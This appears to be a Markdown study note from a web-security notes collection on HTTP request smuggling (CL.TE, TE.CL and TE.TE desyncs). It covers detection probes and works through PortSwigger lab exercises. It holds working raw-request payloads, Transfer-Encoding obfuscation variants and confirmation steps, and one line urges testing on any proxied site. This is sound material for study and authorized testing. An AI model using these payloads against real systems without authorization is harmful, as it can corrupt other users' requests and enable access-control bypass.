# HTTP request smuggling - Fundamentals (CL.TE / TE.CL / TE.TE) + finding

The three classic HTTP/1.1 desyncs and how to detect/confirm them. Everything downstream (control bypass, request capture, cache poisoning) starts here: prove the front-end and back-end disagree on request boundaries. Max impact of the class is Critical; this folder gets you a confirmed desync to build on.

## Quick reference

```
# CL.TE (FE=Content-Length, BE=Transfer-Encoding). FE reads CL bytes, BE stops at chunk 0.
POST / HTTP/1.1
Host: LAB
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G                         # send TWICE -> 2nd response: "Unrecognized method GPOST"

# TE.CL (FE=Transfer-Encoding, BE=Content-Length). UNCHECK "Update Content-Length".
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
                          # trailing \r\n\r\n after final 0 is REQUIRED

# TE.TE - both honor TE; obfuscate so exactly one ignores it:
Transfer-Encoding: chunked
Transfer-encoding: cow    # duplicate w/ bad value -> attack then proceeds as CL.TE or TE.CL
```
Decision list: send any probe **twice**; the desync surfaces on the **2nd** request. CL.TE basic = `0\r\n\r\nG`; TE.CL basic = chunk-wrapped smuggled request with `Content-Length: 4`. If both blocked, obfuscate TE (TE.TE).

## Root cause
HTTP/1.1's dual length headers (`Content-Length` + `Transfer-Encoding: chunked`). A front-end and back-end that pick different headers - or process an obfuscated `Transfer-Encoding` differently - disagree on where the request body ends, leaving attacker bytes to be parsed as the **start of the next request** on a reused back-end connection.

## Find it (recon and detection)
- **Prerequisite:** chained architecture (proxy/LB/CDN in front of app), HTTP/1.1, **reused back-end connections**.
- **Two detection styles:**
  - **Timing-based** (works even when responses look identical; this is what Burp Scanner uses). Exact probes:
    ```
    # CL.TE timing probe - FE forwards partial (omits X), BE waits for next chunk -> DELAY
    POST / HTTP/1.1
    Transfer-Encoding: chunked
    Content-Length: 4

    1
    A
    X
    # TE.CL timing probe - FE forwards partial (omits X), BE waits for more body -> DELAY
    POST / HTTP/1.1
    Transfer-Encoding: chunked
    Content-Length: 6

    0

    X
    ```
    **Stealth order:** run the **CL.TE** timing test FIRST. The TE.CL test can disrupt other users if the app is actually CL.TE-vulnerable - only run TE.CL if CL.TE was negative.
  - **Differential-responses (confirm):** smuggle a prefix for a known endpoint (e.g. `GET /404`) so the **next** request you send returns a tell (404, or `Unrecognized method GPOST`). This is the reliable confirmation step.
- **Confirmation caveats (critical for real targets):**
  - Send the **attack** and **normal** requests over **different connections** (same connection proves nothing).
  - Use the **same URL + parameter names** in both - front-ends route by URL/params to different back-ends; mismatched routing makes the attack miss.
  - You're **racing other users'** requests; send the normal request immediately, retry several times if the app is busy or load-balanced across back-ends.
  - If your interference hits a request that **wasn't** your normal one, you affected a **real user** - stop / be cautious.
- Burp: **uncheck "Update Content-Length"** (Repeater menu) for any TE.CL/TE.TE payload, and include the trailing `\r\n\r\n` after the final `0`.

## Technique
**CL.TE:** front-end honors `Content-Length`, back-end honors `Transfer-Encoding`. Send `Content-Length` covering your whole body, but a `chunked` body whose terminating `0` leaves trailing bytes. Back-end stops at `0`; the trailing bytes (`G`, or a full `GET /...`) become the next request's prefix.

**TE.CL:** front-end honors `Transfer-Encoding`, back-end honors `Content-Length`. Send a `chunked` body (front-end processes the chunks) but a small `Content-Length` (back-end stops early), so the bytes after the back-end's CL cutoff start the next request. Chunk size is hex (`5c` = 92 bytes). Always uncheck Update-CL and add trailing `\r\n\r\n`.

**TE.TE (obfuscation):** both honor TE, so make exactly one ignore it. Obfuscation variants (any one may work depending on the stack):
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked          (space before colon)
Transfer-Encoding: chunked\r\nTransfer-Encoding: x   (duplicate)
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding\n: chunked
```
Once one server ignores the obfuscated TE, the attack proceeds exactly as CL.TE or TE.CL.

**Advanced / edge:** different stacks tolerate different obfuscations - fuzz them. Some front-ends normalize; combine with header-name/value tricks. For HTTP/2 stacks, see `../Advanced-HTTP2/`.

## Payload arsenal
```
# CL.TE confirm via 404
POST / HTTP/1.1
Host: LAB
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X

# TE.CL confirm via 404 (uncheck Update CL; chunk size 5e=94)
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

# TE obfuscation variants - try each:
Transfer-Encoding: chunked\r\nTransfer-encoding: cow
Transfer-Encoding:\tchunked
 Transfer-Encoding: chunked
Transfer-Encoding : chunked
```

## Bypasses
| Blocker | Bypass |
|---|---|
| both servers process TE correctly | obfuscate TE (TE.TE variants) until one ignores it |
| Burp keeps fixing Content-Length | uncheck **Update Content-Length** in Repeater |
| request "completes" too early | add trailing `\r\n\r\n` after final `0` |
| HTTP/2 forced by client | switch to HTTP/1 in Inspector, or use h2 downgrade vectors (`../Advanced-HTTP2/`) |

## Exploitation walkthrough (confirm CL.TE)
1. Repeater: send the CL.TE basic payload (`Content-Length: 6`, body `0\r\n\r\nG`) **twice**.
2. The **second** response returns `Unrecognized method GPOST` ⇒ the `G` was prepended to your second `POST` -> `GPOST` -> desync confirmed.
3. Swap the smuggled prefix for `GET /404 ... X-Ignore: X` to confirm via a clean 404 on the next request. Proceed to `../Exploiting/`.

## Chaining
- Confirmed desync -> [Exploiting](../Exploiting/) (controls bypass, request capture, XSS, cache).
- HTTP/2 stack -> [Advanced-HTTP2](../Advanced-HTTP2/).

## Tools
- **Burp Repeater** (Update-CL off; HTTP/1 in Inspector; send twice).
- **Burp HTTP Request Smuggler** (auto-detect CL.TE/TE.CL/TE.TE + obfuscation fuzzing).
- **Turbo Intruder** for timing probes.

## Labs

### HTTP request smuggling, basic CL.TE vulnerability [Practitioner]
URL: /web-security/request-smuggling/lab-basic-cl-te
- Send twice: `Content-Length: 6`, body `0\r\n\r\nG`. 2nd response = `Unrecognized method GPOST`. Solved.
- Insight: FE counts CL bytes (incl. `G`), BE stops at chunk `0`, leaves `G` -> prepended to next request.

### HTTP request smuggling, basic TE.CL vulnerability [Practitioner]
URL: /web-security/request-smuggling/lab-basic-te-cl
- Uncheck Update-CL. Send twice: `Content-length: 4` + chunked body `5c\r\nGPOST / HTTP/1.1...x=1\r\n0\r\n\r\n`. 2nd response = `Unrecognized method GPOST`.
- Insight: FE processes chunks, BE reads only 4 bytes (`5c\r\n`), leaving `GPOST...` for the next request. Trailing `\r\n\r\n` required.

### HTTP request smuggling, obfuscating the TE header [Practitioner]
URL: /web-security/request-smuggling/lab-obfuscating-te-header
- TE.TE: add a duplicate `Transfer-encoding: cow` alongside `Transfer-Encoding: chunked`; one server ignores the bad one. Then the TE.CL-style payload yields `Unrecognized method GPOST`.
- Insight: duplicate/obfuscated TE makes FE and BE diverge on chunked processing.

### Confirming a CL.TE vulnerability via differential responses [Practitioner]
URL: /web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
- Smuggle `GET /404 HTTP/1.1 / X-Ignore: X` (CL.TE). The **second** request gets a 404 -> confirmed.
- Insight: route the next request to a known-bad path to get an unambiguous tell.

### Confirming a TE.CL vulnerability via differential responses [Practitioner]
URL: /web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
- Uncheck Update-CL. Smuggle `POST /404 ...` via chunk `5e`; second request gets 404 -> confirmed.
- Insight: TE.CL confirmation mirror of CL.TE; chunk size must cover the smuggled request bytes.

Real-target transfer (all): on any proxied site, send a CL.TE/TE.CL probe twice; a desync tell on the *second* request (404/`GPOST`/timeout) = exploitable. Always test obfuscated TE variants.

## Real-world notes
- Request smuggling is frequently Critical and is a top bug-bounty earner (mass impact: every other user on the connection).
- False positives: load balancers that don't reuse back-end connections won't show classic desync - try CL.0/client-side (`../Browser-powered/`).
- Be careful on live targets: smuggling can corrupt other real users' requests - use benign prefixes (`/404`) and your own session for PoCs.

## References
- https://portswigger.net/web-security/request-smuggling
- https://portswigger.net/web-security/request-smuggling/finding
